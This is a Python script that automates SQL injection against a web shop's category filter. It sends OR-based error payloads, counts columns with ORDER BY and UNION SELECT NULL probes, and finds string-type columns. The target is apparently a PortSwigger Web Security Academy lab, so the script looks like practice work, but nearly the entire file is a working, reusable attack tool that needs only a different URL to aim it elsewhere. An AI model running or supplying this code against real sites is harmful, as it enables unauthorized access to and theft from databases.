import requests
# ------------------- SQL Error Based injection-------------------------
ORpayloads = [" ' OR 1=1 -- ", " ' OR '1'='1 -- "]
ORDERpayloads = ["'ORDER BY"]  # 'ORDER BY 1/2/3/4/5....


def or_injection(url):
    print("trying error based injection with or payload.......")
    for i in range(0, len(ORpayloads)):
        r = requests.get(url+ORpayloads[i])
        if r.status_code == 200:
            print("{} worked!".format(url+ORpayloads[i]))

# ---------------------------- Automation Union Based SQL Injection --------------------------------------------------


def order_injection(url):  # for checking how many column are presenting link.
    print("Trying number of column with 'ORDER BY..........")
    for i in range(1, 50):  # it's range of the column.
        query = ORDERpayloads[0] + str(i) + " -- "
        r = requests.get(url+query)
        if r.status_code == 200:
            print("column {} is present".format(i))
        else:
            print("Total number of column are {}".format(i+1))
            return i

# ----create a function which add NULL,NULL statement and check column are str or not.
# Create a function which use NULL,NULL


def null_injection(url):
    print("Trying number of column with NULL,NULL statement......")
    # UNION SELECT NULL*i
    for i in range(1, 13):
        query = "NULL,"*i
        query = query[0:-1]
        # print(query)
        r = requests.get(url+"'UNION SELECT"+query + " -- ")
        # print(r)
        if r.status_code == 500:
            # 500=Internal server error
            print("Column {} gave 500 Internal error.".format(i))
        elif r.status_code == 200:
            print("Total number of column are {}".format(i))
            return i
        else:
            print("!!!")
# -----check which column contain the string------
# replace 'a',NULL,NULL --> NULL,'a',NULL,-->NULL,NULL,'a'
def replaceNth(s,source,target,n):
    inds=[i for i in range(len(s)-len(source)+1)if s[i:i+len(source)]==source]
    if len(inds)<n:
        return  #or may be it raise an error
    s=list(s)
    s[inds[n-1]:inds[n-1]+len(source)]=target  #do n-1= because we start from the first occurance
    return ''.join(s)
def stringcolumn(url,n):
    print("Trying which column contain string type.....")
    query="NULL,"*n
    query=query[0:-1]
    # 'UNION SELECT 'a',NULL -- 
    for i in range(1,n+1):
        fullurl=replaceNth(query,"NULL","'a'",i)
        print(url+"'UNION SELECT",fullurl+" -- ")
        r=requests.get(url+"'UNION SELECT"+fullurl+" -- ")
        if r.status_code==200:
            print("Column {} is string type".format(i))
        else:
            pass

url = "https://0aca0024034a6255c0acc29b000a006d.web-security-academy.net/filter?category=Lifestyle"
# or_injection(url)
# null = null_injection(url)
findcols=order_injection(url)
find_string=stringcolumn(url,findcols)
